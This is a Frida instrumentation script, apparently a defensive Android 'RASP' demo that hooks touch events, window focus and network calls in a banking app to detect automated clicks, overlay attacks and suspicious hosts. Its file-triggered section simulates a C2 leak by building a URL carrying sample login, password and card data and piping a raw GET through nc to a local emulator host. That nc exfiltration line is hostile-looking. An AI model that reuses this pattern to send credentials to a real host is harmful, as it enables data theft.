'use strict';

/* RASP Dynamic Analyzer v2.0 — Frida Agent
 * Hooks: #1 ATS, #2 Overlay-proxy, #3a/#3b Network, + C2 file trigger. */

var TRUSTED  = ["10.0.2.2:8888", "localhost", "127.0.0.1"];
var c2Fired  = false;
var TRIGGER  = "/data/local/tmp/c2_trigger";

function isTrusted(url) {
  for (var i = 0; i < TRUSTED.length; i++)
    if (url.indexOf(TRUSTED[i]) !== -1) return true;
  return false;
}

Script.nextTick(function () {
  Java.perform(function () {

    /* Hook #1 + #2b: ATS detection + real overlay detection via FLAG_WINDOW_IS_OBSCURED */
    var View = Java.use("android.view.View");
    /* FLAG_WINDOW_IS_OBSCURED = 0x1  (android.view.MotionEvent)
       Set by InputDispatcher when an untrusted TYPE_APPLICATION_OVERLAY window
       is visible on top of the receiving window.  Distinct from focus-loss:
       FLAG_NOT_FOCUSABLE overlays never trigger onWindowFocusChanged but they
       still set this flag on every touch delivered to the obscured window. */
    var FLAG_OBSCURED = 0x1;
    var overlayAlertFired = false;  // deduplicate within one session
    View.dispatchTouchEvent.implementation = function (ev) {
      /* #2b — real overlay: check BEFORE the ATS early-return so that even
         synthetic ADB taps trigger the overlay detection. */
      if (!overlayAlertFired && (ev.getFlags() & FLAG_OBSCURED) !== 0) {
        overlayAlertFired = true;
        send({ type: "critical", threat: "Overlay Attack",
               message: "Touch input obscured by overlay window (FLAG_WINDOW_IS_OBSCURED). " +
                        "TYPE_APPLICATION_OVERLAY window detected over banking UI." });
      }
      /* #1 — ATS */
      if (ev.getDeviceId() < 0) {
        send({ type: "critical", threat: "ATS Bot Activity",
               message: "Programmatic click BLOCKED! Source: " +
                        ev.getSource() + ", DeviceID: " + ev.getDeviceId() });
        return true;
      }
      return this.dispatchTouchEvent(ev);
    };
    send({ type: "info", threat: "SYSTEM",
           message: "Hook #1+#2b (ATS / View.dispatchTouchEvent + FLAG_WINDOW_IS_OBSCURED) -- OK" });

    /* Hook #2: Overlay-proxy detection */
    var Activity = Java.use("android.app.Activity");
    var WIT      = Java.use("android.view.WindowInsets$Type");
    Activity.onWindowFocusChanged.implementation = function (hf) {
      if (!hf) {
        var imeVisible = false;
        try {
          imeVisible = this.getWindow().getDecorView()
              .getRootWindowInsets().isVisible(WIT.ime());
        } catch (e) {}
        if (!imeVisible) {
          send({ type: "alert", threat: "Overlay-proxy",
                 message: "Window focus lost (keyboard not open). " +
                          "Possible overlay or external activity in foreground." });
        }
      }
      this.onWindowFocusChanged(hf);
    };
    send({ type: "info", threat: "SYSTEM",
           message: "Hook #2 (Overlay / onWindowFocusChanged) -- OK" });

    /* Hook #3a: DefaultHttpClient.execute */
    try {
      var DHC = Java.use("org.apache.http.impl.client.DefaultHttpClient");
      DHC.execute.overload(
          "org.apache.http.client.methods.HttpUriRequest"
      ).implementation = function (req) {
        var url    = req.getURI().toString();
        var method = req.getMethod();
        var level  = isTrusted(url) ? "warning" : "critical";
        send({ type: level, threat: "Network Request",
               message: (level === "warning" ? "Legitimate: " : "SUSPICIOUS: ") +
                        method + " -> " + url });
        return this.execute(req);
      };
      send({ type: "info", threat: "SYSTEM",
             message: "Hook #3a (Network / DefaultHttpClient.execute) -- OK" });
    } catch (e) {
      send({ type: "info", threat: "SYSTEM",
             message: "Hook #3a not available: " + e.message });
    }

    /* Hook #3a-ext: OkHttp3 (coverage extension, optional) */
    try {
      var OkHttp = Java.use("okhttp3.OkHttpClient");
      var Call   = Java.use("okhttp3.Call");
      OkHttp.newCall.implementation = function (req) {
        var url = req.url().toString();
        var level = isTrusted(url) ? "warning" : "critical";
        send({ type: level, threat: "Network Request",
               message: "[OkHttp] " + (level === "warning" ? "Legitimate: " : "SUSPICIOUS: ") + url });
        return this.newCall(req);
      };
      send({ type: "info", threat: "SYSTEM",
             message: "Hook #3a-ext (OkHttp3 / OkHttpClient.newCall) -- OK" });
    } catch (e) {
      send({ type: "info", threat: "SYSTEM",
             message: "Hook #3a-ext (OkHttp3) not available: " + e.message });
    }

    /* Hook #3b: java.net.URL.$init */
    var URL = Java.use("java.net.URL");
    URL.$init.overload("java.lang.String").implementation = function (url) {
      if (!isTrusted(url)) {
        send({ type: "critical", threat: "C2 Exfiltration",
               message: "SUSPICIOUS URL inside process: " + url +
                        " [NOT a bank server!]" });
      }
      this.$init(url);
    };
    send({ type: "info", threat: "SYSTEM",
           message: "Hook #3b (Network / URL.$init) -- OK" });

    /* C2 file-trigger polling */
    var RT      = Java.use("java.lang.Runtime");
    var FJ      = Java.use("java.io.File");
    var JURL    = Java.use("java.net.URL");
    var JThread = Java.use("java.lang.Thread");
    var JRun    = Java.use("java.lang.Runnable");
    setInterval(function () {
      if (c2Fired) return;
      var f;
      try { f = FJ.$new(TRIGGER); } catch (e) { return; }
      if (!f.exists()) return;
      c2Fired = true;
      try { RT.getRuntime().exec("rm " + TRIGGER); } catch (e) {}
      /* Create URL — triggers hook #3b (C2 Exfiltration detected) */
      var C2_URL = "http://10.0.2.2:9999/exfiltrate" +
                   "?login=jack&pass=Jack%40123&card=4111111111111111";
      try { JURL.$new(C2_URL); } catch (e) {}
      /* Make actual HTTP request via nc for server.log confirmation */
      try {
        RT.getRuntime().exec([
          "sh", "-c",
          "printf '%s\\r\\n%s\\r\\n\\r\\n' " +
          "'GET /exfiltrate?login=jack&pass=Jack@123&card=4111111111111111 HTTP/1.0' " +
          "'Host: 10.0.2.2:9999' | /system/bin/nc -w 5 10.0.2.2 9999"
        ]);
      } catch (e) {
        send({ type: "info", threat: "SYSTEM",
               message: "C2 nc error: " + e.message });
      }
    }, 500);

    send({ type: "info", threat: "SYSTEM",
           message: "=== All hooks active. Monitoring started. ===" });
  });
});
